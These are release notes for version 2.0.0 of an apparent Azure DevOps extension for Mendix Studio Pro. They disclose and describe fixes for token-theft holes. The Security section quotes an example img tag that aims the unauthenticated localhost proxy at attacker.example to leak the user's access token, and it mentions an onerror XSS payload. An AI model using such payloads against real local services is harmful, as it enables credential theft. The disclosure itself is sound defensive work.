# Release Notes

## 2.0.0 — 2026-08-01

A security-focused release. Two vulnerabilities that could expose your Personal Access Token
are closed, all externally-authored HTML is now sanitized before rendering, and the Settings
tab gained a build panel so you can confirm which build Studio Pro is actually running.

**This is a major version because the local API contract changed** — see
[Breaking changes](#breaking-changes).

---

### Security

#### The local API is now token-gated

The extension's backend listens on `http://localhost:5678`. Previously it had no
authentication of any kind, which meant **any web page you visited while Studio Pro was open
could drive it**. Because several endpoints proxy requests using your stored PAT, a hostile
page could harvest the credential with nothing more than:

```html
<img src="http://localhost:5678/api/attachments/proxy?url=https://attacker.example/">
```

A plain `GET` from an `<img>` needs no CORS preflight, so the request fired and the PAT
landed in the attacker's access log.

The host now generates a random 256-bit token at every start and injects it into the
`index.html` it serves. Every `/api/*` request must present it — as an `X-Ado-Token` header
for `fetch` calls, or a `?t=` query parameter for `<img src>` / `<a href>` URLs, which can't
send headers. Comparison is constant-time. `index.html` is served with `no-store` so a cached
copy can never carry a stale token.

#### Proxy targets are restricted to your Azure DevOps host

`/api/attachments/proxy`, `/api/attachments/download`, and `/api/releases/log` take a target
URL from the caller and forward it **with the PAT attached**. Nothing validated that URL, so
the proxy would send your credential anywhere it was pointed — including internal network
addresses and cloud metadata endpoints.

The host is now checked before any credential is sent. Only the configured organization host
is permitted, plus Microsoft's own sibling domains (`dev.azure.com`, `visualstudio.com`,
`vsassets.io`) when connected to Azure DevOps Services. On-premises installs may only ever
talk to their own configured host. Non-HTTP schemes such as `file://` are rejected outright.

#### All external HTML is sanitized

Work item descriptions and comments, wiki Markdown output, and rich-text editor content are
authored by anyone with write access to your project. That HTML was previously assigned
straight to `innerHTML`. This doesn't run `<script>`, but it very much runs
`<img src=x onerror=…>` — and script executing inside the pane shares an origin with the
local backend, so it could read the session token and drive the PAT-bearing endpoints.

All three render paths now go through DOMPurify. Legitimate content is preserved: inline
`style` attributes (ADO's own editor emits them heavily), `data:` image previews, attachment
images, mention anchors, and tables all render exactly as before. Links in rendered content
now carry `target="_blank"` and `rel="noopener noreferrer"`.

---

### Fixed

- **Inline images disappeared while editing a description.** Read mode routed attachment
  images through the authenticated proxy; the editor dropped the raw Azure DevOps URL into
  `<img src>`, where the browser had no PAT to send and the image silently failed to load. It
  looked like editing had deleted the image, and it reappeared on cancel. The editor now uses
  the same proxy path, and restores the original URL before anything is submitted — the proxy
  URL and its token are never written back into a work item.

  *No data was ever lost to this: the image element was always present with the correct URL,
  so descriptions saved from that state were written back correctly.*

- **Settings did not survive a restart** — saved connections and the server port reverted to
  defaults every time Studio Pro restarted. `settings.json` was written next to the loaded DLL,
  but Studio Pro doesn't run the extension from `extensions\MendixAzureDevOpsExtension\`: it
  copies it into `{AppDir}\.mendix-cache\extensions-cache\{guid}\` and loads it from there. That
  cache is regenerated on sync, taking the settings with it. Settings are now anchored to the
  Mendix app root (the nearest folder containing the `.mpr`), which is stable and still isolated
  per app; `%APPDATA%` remains the fallback. Settings found in an old cache folder are migrated
  across automatically on first run.

- **The panel showed the status page on startup** and only worked after closing and reopening
  it. Studio Pro can restore a previously-open pane before the extension's load event fires, so
  the pane navigated before the server had a port or session token. Opening a pane now ensures
  the backend is started first.

- **Settings location is now visible** in the Settings → Build panel, with a warning if it ever
  resolves somewhere volatile.

- **Stale frontend bundles could accumulate** in the build output and ride along into
  deployments. The deploy step now produces exactly the current build.

---

### Added

- **Build panel in the Settings tab.** The extension's two halves reload independently — the
  SPA on a pane refresh, the DLL only when Studio Pro reloads the extension — so a change can
  land in one and not the other. The panel shows four stamps and tells you which side is stale:

  | Row | Meaning |
  |---|---|
  | UI bundle | When the loaded frontend bundle was built |
  | Backend | Build stamp compiled into the DLL (`2.0.0+build.yyMMdd.HHmmss`) |
  | DLL built | Last-write time of the DLL on disk |
  | Loaded at | When Studio Pro last started the backend |

  If **DLL built** is newer than **Loaded at**, Studio Pro is still running the previous DLL.
  If **UI bundle** is older than your last build, press **F5** in the pane.

- **`GET /api/version`** — reports the build stamp, the DLL's path and timestamp, and when the
  backend started. Token-gated like every other endpoint.

- **Configurable server port**, under a new **General** section at the top of the Settings tab.
  The default (`5678`) is shown inline, along with the port currently in use. The port is
  validated on save — range-checked and rejected if another application already holds it — and
  applies when Studio Pro next starts, since this panel is served from the port being changed.

- **Status page for browser visitors.** Opening `http://localhost:5678` in a normal browser
  used to serve the app shell — which couldn't function outside the pane, and handed over the
  session token to whoever asked. It now shows a small status card identifying the extension
  and reporting health: version, port, uptime, and how many connections are configured. No
  session token, no organization details. The dockable pane is unaffected: it loads a URL
  carrying the token and still gets the full app.

- **`GET /health`** — unauthenticated JSON status (`status`, `name`, `version`, `port`,
  `startedUtc`) for scripts and monitors. Carries nothing sensitive.

- **Automatic port fallback.** If the configured port is taken at startup, the server now falls
  back to the default and then to any free port, rather than silently failing to bind and
  leaving a blank pane. The dockable pane navigates to whatever port was actually bound, and
  the Settings panel flags any divergence between configured and running.

---

### Changed

- **Build no longer depends on a specific ASP.NET Core runtime being installed.** The bundled
  framework assemblies come from a locally installed runtime when present, otherwise from a
  NuGet runtime pack, instead of a hard-coded `8.0.21` path that failed on most machines.
- **Settings moved to a durable, per-app location** — `{AppRoot}\extensions\MendixAzureDevOpsExtension\settings.json`,
  with `%APPDATA%` as fallback. Existing settings are migrated automatically on first run.
- **New dependency:** `dompurify` ^3.4.

---

### Breaking changes

- **Any external tooling that called `http://localhost:5678/api/*` directly will now get
  `401`.** Requests must carry the session token, which is only available to the page the
  backend serves. There is no opt-out.
- **Rendered HTML is filtered.** `<script>`, `<iframe>`, `<form>`, inline SVG, and event
  handler attributes are stripped from work item, comment, and wiki content at render time.
  The stored content in Azure DevOps is untouched — this affects display only.
- **A full Studio Pro restart is required.** The DLL is loaded in-process; an instance holding
  the port will keep serving the old build until it exits. Confirm via the Build panel.

---

### Upgrading from 1.x

1. Deploy the new build, then **restart Studio Pro** — reloading the extension is not enough if a
   previous instance still holds the port.
2. Open **Settings → Build** and confirm `Backend` reads `2.0.0`, and that the `Settings` row points
   at your app folder rather than anywhere under `.mendix-cache`.
3. Your connections and PAT carry over automatically. If they don't appear, they were lost to the
   settings bug this release fixes — re-add the connection once and it will persist from now on.
